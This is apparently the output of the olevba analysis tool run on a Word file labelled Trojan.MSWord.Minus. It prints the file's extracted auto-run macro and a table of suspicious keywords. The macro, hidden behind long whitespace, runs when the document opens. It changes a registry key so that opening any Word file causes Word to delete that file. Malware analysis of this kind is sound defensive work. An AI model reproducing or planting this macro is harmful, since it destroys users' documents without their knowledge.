olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Minus-078ca3c658348f29e676fcb07772bbc3edb98396
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Minus-078ca3c658348f29e676fcb07772bbc3edb98396 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                    Private Sub Document_Open(): System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\Open\ddeexec", "") = "['DDE-Bacteria][On Error Resume Next][Kill(""%1"")]": End Sub 'VOVAN//SMF
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

